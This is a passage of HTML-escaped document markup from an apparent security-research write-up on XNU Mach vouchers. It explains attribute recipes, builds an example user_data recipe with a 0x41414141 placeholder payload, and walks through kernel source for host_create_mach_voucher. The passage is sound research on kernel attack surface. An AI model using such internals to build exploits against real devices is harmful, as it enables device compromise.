class="BGLtzooHlW-c10"&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c19 BGLtzooHlW-c11"&gt;BANK_ORIGINATOR_PID&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c19 BGLtzooHlW-c11"&gt;BANK_PERSONA_TOKEN&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c19 BGLtzooHlW-c11"&gt;BANK_PERSONA_ID&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c17"&gt;importance&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c19 BGLtzooHlW-c11"&gt;MACH_VOUCHER_IMPORTANCE_ATTR_DROP_EXTERNAL&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c17"&gt;user_data&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c10"&gt;none&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c17"&gt;pthread_priority&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c10"&gt;none&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;Let&amp;#39;s look at example recipe for creating a voucher with a single &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;user_data&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;attr, consisting of the 4 bytes {0x41, 0x41, 0x41, 0x41}:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.a9632b719aa64a5ca7f22f3e9944b5fd0708e9e6"&gt;&lt;/a&gt;&lt;a id="t.13"&gt;&lt;/a&gt;&lt;table class="BGLtzooHlW-c12"&gt;&lt;tbody&gt;&lt;tr class="BGLtzooHlW-c1"&gt;&lt;td class="BGLtzooHlW-c13" colspan="1" rowspan="1"&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c6"&gt;struct&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;udata_dword_recipe &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; mach_voucher_attr_recipe_data_t recipe&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; uint32_t payload&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c2"&gt;};&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c6"&gt;struct&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;udata_dword_recipe r &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;0&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;};&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;r&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;.&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;recipe&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;.&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;key &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;MACH_VOUCHER_ATTR_KEY_USER_DATA&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;r&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;.&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;recipe&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;.&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;command &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;MACH_VOUCHER_ATTR_USER_DATA_STORE&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;r&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;.&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;recipe&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;.&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;content_size &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;sizeof&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;uint32_t&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;r&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;.&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;payload &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;0x41414141&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c10"&gt;Let&amp;#39;s follow the path of this recipe in detail.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;Here&amp;#39;s the most important part of &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;host_create_mach_voucher&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;showing the three high-level phases: voucher allocation, attribute creation and voucher de-duping. It&amp;#39;s not the responsibility of this code to find or allocate a mach port for the voucher; that&amp;#39;s done by the MIG layer code.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.caafa58444ef86dee8c472d187debed00ee56da7"&gt;&lt;/a&gt;&lt;a id="t.14"&gt;&lt;/a&gt;&lt;table class="BGLtzooHlW-c12"&gt;&lt;tbody&gt;&lt;tr class="BGLtzooHlW-c1"&gt;&lt;td class="BGLtzooHlW-c13" colspan="1" rowspan="1"&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;/* allocate new voucher */&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;voucher &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;iv_alloc&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivgt_keys_in_use&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c6"&gt;if&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;IV_NULL &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;==&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;voucher&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;return&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;KERN_RESOURCE_SHORTAGE&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;/* iterate over the recipe items */&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c6"&gt;while&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;0&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;&amp;lt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;recipe_size &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;recipe_used&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; ipc_voucher_t prev_iv&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;if&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;recipe_size &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;recipe_used &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;&amp;lt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;sizeof&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(*&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;sub_recipe&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;))&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; kr &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;KERN_INVALID_ARGUMENT&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;break&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;/* find the next recipe */&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; sub_recipe &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;mach_voucher_attr_recipe_t&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)(&lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;void&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;*)&amp;amp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;recipes&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;[&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;recipe_used&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;];&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;if&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;recipe_size &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;recipe_used &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;sizeof&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(*&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;sub_recipe&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;&amp;lt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; sub_recipe&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;content_size&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; kr &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;KERN_INVALID_ARGUMENT&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;break&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; recipe_used &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;+=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;sizeof&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(*&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;sub_recipe&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;+&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;sub_recipe&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;content_size&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;/* convert voucher port name (current space) */&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;/* into a voucher reference */&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; prev_iv &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; convert_port_name_to_voucher&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;sub_recipe&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;previous_voucher&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;if&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;MACH_PORT_NULL &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;!=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;sub_recipe&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;previous_voucher &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; IV_NULL &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;==&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;prev_iv&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; kr &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;KERN_INVALID_CAPABILITY&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;break&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; kr &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;ipc_execute_voucher_recipe_command&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;voucher&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;sub_recipe&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;key&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;sub_recipe&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;command&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;prev_iv&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;sub_recipe&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;content&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;sub_recipe&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;content_size&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;FALSE&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; ipc_voucher_release&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;prev_iv&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span 